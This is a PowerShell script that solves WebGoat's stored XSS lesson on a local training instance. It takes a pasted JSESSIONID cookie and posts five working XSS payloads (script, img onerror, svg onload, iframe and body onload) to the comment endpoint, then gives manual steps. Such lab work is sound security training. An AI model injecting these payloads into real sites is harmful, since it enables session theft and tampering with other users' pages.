# Stored XSS - Comment Injection

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Stored XSS - phoneHome Exploit" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Get your JSESSIONID from browser console: document.cookie" -ForegroundColor White
Write-Host ""
$rawInput = Read-Host "Paste JSESSIONID value"

# Clean up the input
$webgoatSessionId = $rawInput -replace '"', '' -replace "'", '' -replace 'JSESSIONID=', '' -replace 'JSESSIONID:', '' -replace '\s', ''

if ([string]::IsNullOrWhiteSpace($webgoatSessionId)) {
    Write-Host "No session ID provided. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Using session: $webgoatSessionId" -ForegroundColor Green
Write-Host ""

# Create web session with cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $webgoatSessionId, "/", "localhost")
$session.Cookies.Add("http://localhost:8001", $cookie)

$commentUrl = "http://localhost:8001/WebGoat/CrossSiteScriptingStored/stored-xss"

# XSS payloads that call phoneHome
$payloads = @(
    "<script>webgoat.customjs.phoneHome()</script>",
    "<img src=x onerror='webgoat.customjs.phoneHome()'>",
    "<svg onload='webgoat.customjs.phoneHome()'>",
    "<iframe src='javascript:webgoat.customjs.phoneHome()'>",
    "<body onload='webgoat.customjs.phoneHome()'>"
)

Write-Host "Testing Stored XSS payloads..." -ForegroundColor Cyan
Write-Host ""

foreach ($payload in $payloads) {
    Write-Host "Trying payload: $payload" -ForegroundColor Yellow
    
    try {
        $body = "text=$([System.Uri]::EscapeDataString($payload))"
        
        $response = Invoke-WebRequest -Uri $commentUrl -Method POST -WebSession $session -ContentType "application/x-www-form-urlencoded; charset=UTF-8" -Body $body -UseBasicParsing -ErrorAction Stop
        
        Write-Host "  Response Status: $($response.StatusCode)" -ForegroundColor Green
        
        try {
            $jsonResponse = $response.Content | ConvertFrom-Json
            
            if ($jsonResponse.output) {
                Write-Host ""
                Write-Host "=== SUCCESS! ===" -ForegroundColor Green
                Write-Host "phoneHome Response: $($jsonResponse.output)" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "Copy this value and submit it in the form!" -ForegroundColor Yellow
                Write-Host "Response: $($response.Content)" -ForegroundColor Gray
                break
            }
            
            if ($jsonResponse.lessonCompleted -eq $true) {
                Write-Host "  Lesson completed!" -ForegroundColor Green
            }
            
            Write-Host "  Full response: $($response.Content)" -ForegroundColor Gray
        }
        catch {
            Write-Host "  Response content: $($response.Content.Substring(0, [Math]::Min(200, $response.Content.Length)))" -ForegroundColor Gray
        }
    }
    catch {
        if ($_.Exception.Message -match "401") {
            Write-Host "  SESSION EXPIRED!" -ForegroundColor Red
            exit 1
        }
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

Write-Host ""
Write-Host "=== MANUAL INSTRUCTIONS ===" -ForegroundColor Cyan
Write-Host ""
Write-Host "If the script didn't work, try manually in the browser:" -ForegroundColor Yellow
Write-Host "1. Type this in the comment box:" -ForegroundColor White
Write-Host "   <script>webgoat.customjs.phoneHome()</script>" -ForegroundColor Green
Write-Host ""
Write-Host "2. Click the edit icon to post the comment" -ForegroundColor White
Write-Host "3. Open Developer Console (F12) and look for:" -ForegroundColor White
Write-Host "   'phoneHome Response is ...' message" -ForegroundColor Green
Write-Host "4. Copy that value and paste it in the submission form" -ForegroundColor White
